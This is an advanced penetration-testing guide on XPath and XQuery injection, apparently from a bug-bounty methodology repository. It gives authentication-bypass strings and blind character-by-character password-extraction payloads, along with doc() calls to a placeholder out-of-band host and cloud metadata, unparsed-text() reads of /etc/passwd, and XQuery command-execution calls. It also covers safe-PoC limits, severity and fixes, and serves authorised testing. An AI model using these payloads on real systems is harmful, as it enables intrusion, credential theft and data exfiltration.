# XPath Injection — Advanced Testing Guide

**Author:** x8bitranjit
**Class:** XPath / XQuery Injection (XML-backed auth, native XML databases, SAML, XML config lookups)
**Impact ceiling:** **Authentication bypass** · **full XML-document blind extraction** (dump every user/password) · **file read + SSRF** (XPath 2.0/3.0 `doc()`/`unparsed-text()`) · **RCE** (XQuery injection on native XML DBs).
**Primary CWE:** CWE-643 (Improper Neutralization of Data within XPath Expressions) · CWE-652 (XQuery Injection).

> ⚠️ **Advanced guide.** Get the basics first from **PortSwigger / OWASP — XPath Injection**, **OWASP Testing Guide (Testing for XPath Injection)**, **HackTricks — XPath injection**, **PayloadsAllTheThings/XPATH Injection**, and the **W3C XPath function reference**. This is the **sibling of SQLi and [../LDAP/](../LDAP/)** — same query-injection mindset, different (XML) query language. If you've done the LDAP kit, the blind-extraction engine here is the same shape.

---

## Read this first — why XPath injection still lands

When an app authenticates or looks data up against an **XML document** by pasting user input into an XPath expression —
`//user[name/text()='$u' and password/text()='$p']` — an attacker who supplies `' or '1'='1` rewrites the logic to "match everything" and **logs in with no valid credentials**. And because the *entire* dataset lives in one XML document, a boolean oracle lets you walk it **node by node, character by character** and exfiltrate every username and password — there's no per-table permission model to stop you.

Why it pays **High/Critical**:
- **Auth bypass, no credentials** — the classic, unauthenticated, often lands as the first/admin user.
- **Whole-document exfiltration** — `substring()`/`string-length()`/`count()` over a boolean oracle dumps the *complete* XML store (all users, hashes, secrets). One injectable field → total data disclosure.
- **XPath 2.0/3.0 escalation** — `doc()`/`document()` → **SSRF/OOB**, `unparsed-text()` → **arbitrary file read**.
- **XQuery injection** on native XML DBs (eXist-db, BaseX, MarkLogic, Sedna) reaches **RCE** via extension functions.

**Report impact, not the quote error.** "A single quote breaks the page" is a *lead*. "I logged in as admin with no password" or "I extracted every user's password hash from the XML store" is the finding. Drive to **auth bypass, the data you dumped, the file you read, or the code you ran.**

**Core mental model.** Same as SQLi/LDAP: your input is concatenated into a query language; you **break out of the string literal** and inject **predicate logic** (`or`/`and`) or **functions** (`substring`, `count`). The twist: **XPath 1.0 has no comment syntax** — you can't `--`/`#` away the rest of the query. Instead you **balance the trailing quote** so the expression stays syntactically valid (e.g. `' or '1'='1` leaves the closing `'` to pair with the app's).

---

## Master Testing Sequence

1. **Find XPath sinks** — XML-backed login, native XML-DB queries, SAML attribute selection, XML config/`web.xml` lookups, SOAP over XML, search across an XML document.
2. **Fingerprint** — XPath **version** (1.0 vs 2.0/3.0 — governs `doc()`/`unparsed-text()`/`error()`) and the injection **context** (single- vs double-quote string, numeric, element/attribute).
3. **Detect** — quote/error probing → boolean differential (`or 1=1` vs `or 1=2`), control-baselined.
4. **Exploit** — auth bypass → blind extraction (`count`/`string-length`/`substring`) → error-based → XPath 2/3 `doc`/`unparsed-text` → XQuery RCE.
5. **Validate → severity → SAFE-PoC → report.**

---

# PART I — Find & fingerprint

## 1.1 Where XPath is used

- **XML-based authentication** — credentials stored in `users.xml`, login runs an XPath match.
- **Native XML databases** — eXist-db, BaseX, MarkLogic, Sedna, Tamino (queried with XPath/**XQuery**).
- **SAML** — some SPs select assertion attributes/NameID via XPath (injectable if built from input) — see [../OAuth/](../OAuth/).
- **XML config / catalog lookups** — product catalogs, menus, permissions in XML.
- **SOAP / XML APIs** — server selects nodes from the request/DB via XPath.
- **XSLT** — `xsl:value-of select="$userinput"` style injection (XSLT injection is a close cousin).

Grep/observe for: XML content-types, `.xml` data files, `selectNodes`/`selectSingleNode`, `XPathExpression`, `xpath.evaluate`, `//`, `document(`, `/*[`, native-XML-DB errors.

## 1.2 Fingerprint the XPath version (decides your escalation)

| Available | Version | Escalation |
|-----------|---------|-----------|
| Only `substring`, `count`, `string-length`, `contains`, `name`, `position` | **XPath 1.0** | blind extraction only (no `doc()`) |
| `doc()`, `document()`, `unparsed-text()`, `error()`, `matches()`, `lower-case()`, `string-join()` | **XPath 2.0/3.0** | + SSRF/OOB (`doc`) + file read (`unparsed-text`) |
| `let`/`for`/`return`, FLWOR, extension modules | **XQuery** (native XML DB) | + RCE (extension functions) |

Probe: does `string-length(...)` work (1.0+)? does `lower-case('A')='a'` or `matches('a','a')` evaluate (2.0+)? does a FLWOR expression parse (XQuery)?

## 1.3 Injection context

- **Single-quote string:** `...='$input'` → break with `'`.
- **Double-quote string:** `...="$input"` → break with `"`.
- **Numeric / position:** `[position()=$input]` → inject without quotes (`1 or 1=1`).
- **Element/attribute name or path fragment:** rarer; may allow `|` union or path traversal within the node tree.

---

# PART II — Detection (control-baselined)

Capture a baseline (valid input, and clearly-invalid input) first; measure the *difference*.

## 2.1 Quote / error probing

```
'          "          `          )          ]          '"          %27
' or '     " or "     (unbalanced -> XML/XPath parse error, 500, or "Invalid expression")
```
An `XPathException` / `SAXParseException` / `unterminated` / `Invalid predicate` leak confirms input reaches an XPath sink and reveals the quote context.

## 2.2 Boolean differential (the core test)

Inject an always-true vs always-false tail and diff the response (status/length/records/login result):

```
# always TRUE (expect more/all/login-ok):
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
' or true() or '                 # (2.0 has true(); 1.0 use '1'='1')

# always FALSE (the control):
' or '1'='2
' and '1'='2
x' or 1=2 or 'x'='y
```
Consistent TRUE≠FALSE difference (that isn't just an error) = **XPath injection confirmed**. Try both `'` and `"` contexts.

## 2.3 The "no comments" rule

XPath 1.0 has **no comment syntax** — you cannot truncate the rest of the query. So every payload must leave the expression **syntactically balanced**. The idiom is a trailing open-string that pairs with the app's closing quote:

```
app template : //user[name='INPUT' and password='...']
inject INPUT : ' or '1'='1
result       : //user[name='' or '1'='1' and password='...']   <- valid, and TRUE
```
(`and` binds tighter than `or` in XPath, so the trailing `or '1'='1'` dominates → the whole predicate is true.)

---

# PART III — Authentication bypass (the flagship)

Inject into the username and/or password field of an XML-backed login:

```
# into username (password left as anything):
' or '1'='1
admin' or '1'='1                     # target the admin node specifically
' or ''='
'or'1'='1                            # no-space variant (filter bypass)
' or 1=1 or ''='
"] | //user/*[position()=1] | a["    # union-based: widen the node-set (advanced)

# into both fields:
username = ' or '1'='1
password = ' or '1'='1

# double-quote context:
" or "1"="1
```

**Union (`|`) breakout** — XPath's `|` unions node-sets; injecting `']|//user|a['`-style payloads can return nodes outside the intended predicate (e.g. every `//user`), bypassing the filter and sometimes disclosing extra nodes.

→ **Impact:** authenticated session with **no valid password** → often admin → High/Critical.

---

# PART IV — Blind data extraction (the LDAP-model engine → full dump)

When you can't see data but have a **boolean oracle** (login ok/nok, record present/absent, status/length diff), reconstruct the whole XML document. This is the same char-by-char engine as [../LDAP/](../LDAP/) and [../NoSQLi/](../NoSQLi/):

## 4.1 Structure discovery
```
count(//*)                                        # total nodes
count(//user)                                     # how many user records
name(//user[1]/*[1])                              # first child element's name (2.0: local-name)
count(//user[1]/*)                                # fields per user
```
Injected as a boolean: `... or count(//user)=25 or ...` — flip the number until TRUE.

## 4.2 Length discovery
```
' or string-length((//user[1]/password))=32 or 'x'='y
```
Increment until TRUE → exact length (bounds the extraction).

## 4.3 Character-by-character
```
# does char i of the first user's password equal 'a'?  flip the char/position until TRUE:
' or substring((//user[1]/password),1,1)='a' or 'x'='y
' or substring((//user[1]/password),2,1)='b' or 'x'='y
# binary-search the codepoint for speed (fewer requests):
' or string-to-codepoints(substring((//user[1]/password),1,1))[1] > 109 or 'x'='y     # (2.0)
```
Iterate position × charset (or binary-search). Then move to `//user[2]`, `//user[3]`, … to dump **every** record. Automate with `poc/xpath_blind.py`.

## 4.4 Extract names/attributes
```
substring(name(//user[1]/*[2]),1,1)='p'          # discover element names blind
//user[1]/@id                                     # attributes
//user[position()=1]/child::node()[position()=2] # positional navigation
```

→ **Impact:** **complete disclosure** of the XML store — every credential/secret. High/Critical.

---

# PART V — Error-based & XPath 2.0/3.0 / XQuery escalation

## 5.1 Error-based extraction
Force the engine to put data into an error message (implementation-specific): e.g. cast a node-set into a context that errors and echoes its value, or trigger a type error containing the selected string. Faster than blind when errors are verbose.

## 5.2 `doc()` / `document()` → SSRF / OOB (XPath 2.0+)
```
' or doc('http://YOUR-OOB/x')      # server-side fetch -> SSRF / blind-OOB confirmation
doc('http://169.254.169.254/latest/meta-data/')     # cloud metadata (chain ../SSRF/)
```
`doc()` makes the XML engine fetch a URL — a clean **SSRF** primitive and an **out-of-band** oracle for blind injection (exfiltrate a value into the hostname/path of a callback).

## 5.3 `unparsed-text()` → arbitrary file read (XPath 2.0+)
```
' or unparsed-text('file:///etc/passwd')
unparsed-text('file:///c:/windows/win.ini')
```
Reads a local file as text (bypasses XML well-formedness) → source/secret disclosure. Combine with the OOB oracle to exfil blind.

## 5.4 XQuery injection → RCE (native XML DBs)
On eXist-db / BaseX / MarkLogic / Sedna, the query language is **XQuery**, and injection can reach **extension functions** that run code:
```
# eXist-db:  util:eval / system:...  ; BaseX: proc:system('id') ; MarkLogic: xdmp:* 
'] ; import module ... ; proc:system('id') ; (: ...          # engine-specific
```
FLWOR (`for/let/where/return`) and module imports let you pivot from data theft to **command execution**. Match the payload to the specific XML DB (BaseX `proc:system`, MarkLogic `xdmp:spawn`/`xdmp:document-load`, eXist `util:eval`/`file:*`).

## 5.5 XPath injection vs XXE (don't confuse them)
- **XXE** ([../XXE/](../XXE/)) = you control the **XML input document** and inject a **DOCTYPE/entity**.
- **XPath injection** = you control a **value concatenated into the query** that runs *against* an XML document.
Different root cause, different fix — though both can reach file-read/SSRF, and a target may have both.

---

# PART VI — Escalate & chain

| You found | Do this | Severity |
|-----------|---------|----------|
| `' or '1'='1` changes login | Auth bypass → land as first/admin user | Critical/High |
| Boolean oracle on any param | `substring`/`string-length`/`count` → dump the whole XML store (all creds) | Critical/High |
| XPath 2.0 (`doc()` works) | `doc('http://oob')` → SSRF/OOB; metadata → cloud creds (→ [../SSRF/](../SSRF/)) | High/Critical |
| `unparsed-text()` works | Read `/etc/passwd`, app config, keys | High |
| Native XML DB (BaseX/MarkLogic/eXist) | XQuery extension fn → RCE | Critical |
| Verbose XPath errors | Error-based extraction (faster than blind) | High |

**Chains:** [../LDAP/](../LDAP/) & [../NoSQLi/](../NoSQLi/) (same blind engine/mindset), [../SSRF/](../SSRF/) (`doc()` metadata), [../XXE/](../XXE/) (sibling XML bug on the same endpoint), [../OAuth/](../OAuth/) (SAML XPath), auth-bypass → ATO.

---

# PART VII — Validity, false positives, severity, reporting

## 7.1 False-positive auto-reject table

| Observation | Why it's NOT (yet) a finding | What makes it real |
|-------------|------------------------------|--------------------|
| `'` throws a 500/error | Error ≠ exploitable injection | A boolean payload that **changes results** or logs you in |
| `' or '1'='1` returns 200 | 200 alone proves nothing | A **difference** vs the `' or '1'='2` control (records/login/length) |
| Login "works" once with a payload | Cached session / your own creds | Reproduce in a **fresh** session, **no** valid password, as a **different**/admin user |
| `count(//user)` reflected somewhere | Reflection ≠ execution | The count **controls the boolean** (oracle flips with the number) |
| Timing blip | Jitter | Not a timing class here — rely on boolean/content diffs |
| App uses XML | Tech ≠ vuln | An actually-injectable parameter |

**Golden rule:** an XPath-injection finding needs a **controlled, repeatable change in query behavior** — you logged in without a password, you extracted data, you read a file, or you ran code. A lone error or single odd response is a *lead*.

## 7.2 Severity calibration (CVSS + CWE)

| Scenario | Severity | CWE |
|----------|----------|-----|
| Auth bypass → admin, no credentials | **Critical (9–10)** | CWE-643 → CWE-287 |
| Full XML-store blind extraction (all creds) | **Critical/High** | CWE-643 |
| XQuery injection → RCE | **Critical** | CWE-652 → CWE-94/78 |
| `doc()` SSRF → cloud metadata/creds | **High/Critical** | CWE-643 → CWE-918 |
| `unparsed-text()` file read | **High** | CWE-643 |
| Partial/limited data disclosure | **Medium/High** | CWE-643 |
| Injection confirmed, no data/impact extracted | **Low/Medium** | CWE-643 |

## 7.3 SAFE-PoC discipline

- **Auth bypass:** log into a **test** account (or your own admin in a lab); on a real target prove access to the account page/`whoami`, one screenshot, **don't** roam real user data.
- **Blind extraction:** extract **your own** record / a benign marker to prove the primitive; stop after enough characters — **don't** dump every user's hash from prod.
- **`doc()`/`unparsed-text()`:** hit **your own** OOB host / read a benign file (`win.ini`, a non-secret) once to prove; **don't** exfiltrate secrets or pivot deep.
- **XQuery RCE:** one benign command (`id`/OOB) then STOP; no shells/persistence; tear down listeners.
- Throttle blind loops; don't hammer prod; redact extracted values in the report.

## 7.4 Reporting

Lead with impact + a minimal reproduction: the exact injected value (both quote contexts if relevant), the control vs injected responses, and the result (session/data/file). Use [XPATH_REPORT_TEMPLATE.md](XPATH_REPORT_TEMPLATE.md). Name the sink (`//user[name='"+input+"']` built by string concatenation) and the fix (parameterize with variable binding / `XPathVariableResolver`; validate+escape; least-privileged, non-XQuery engine).

## 7.5 References & further reading

**Core methodology**
- PortSwigger — XPath injection (blind + error-based) + Web Security Academy labs: https://portswigger.net/web-security/xpath-injection
- OWASP WSTG — Testing for XPath Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection
- HackTricks — XPath injection: https://book.hacktricks.xyz/pentesting-web/xpath-injection
- PayloadsAllTheThings — XPATH Injection (payload corpus): https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection
- PentesterLab — XML/XPath injection exercises: https://pentesterlab.com/
- W3C — XPath & XQuery function reference (the version/function map that decides your escalation): https://www.w3.org/TR/xpath-functions/

**Class-specific tools & research**
- **xcat** (Tom Forbes) — the reference blind-XPath extraction tool (boolean + OOB via `doc()`, file read, XPath 1.0/2.0): https://github.com/orf/xcat
- Native XML-DB **XQuery RCE** research — BaseX `proc:system`, eXist-db `util:eval`/`file:*`, MarkLogic `xdmp:*` (match the engine's extension-function catalog before firing).
- **SAML** XPath assertion/NameID-selection issues (see [../OAuth/](../OAuth/)); classic XML-authentication-bypass advisories.

**Standards**
- **CWE-643** (Improper Neutralization of Data within an XPath Expression) · **CWE-652** (Improper Neutralization of Data within an XQuery Expression): https://cwe.mitre.org/data/definitions/643.html
- **CVSS 3.1** (auth-bypass / XQuery-RCE ≈ 9–10 Critical): https://www.first.org/cvss/calculator/3.1

---

## Companion files
- **[XPATH_ARSENAL.md](XPATH_ARSENAL.md)** — payloads + functions + tools.
- **[XPATH_CHECKLIST.md](XPATH_CHECKLIST.md)** — phase-by-phase + auto-reject.
- **[XPATH_REPORT_TEMPLATE.md](XPATH_REPORT_TEMPLATE.md)** — report skeleton.
- **[XPath_Zero_to_Expert.md](XPath_Zero_to_Expert.md)** — 100-question study + field reference.
- **[poc/](poc/)** — `xpath_fuzz.py` (detect + auth-bypass, control-baselined) · `xpath_blind.py` (count/length/substring char-by-char) · `xcat_cheat.md`.
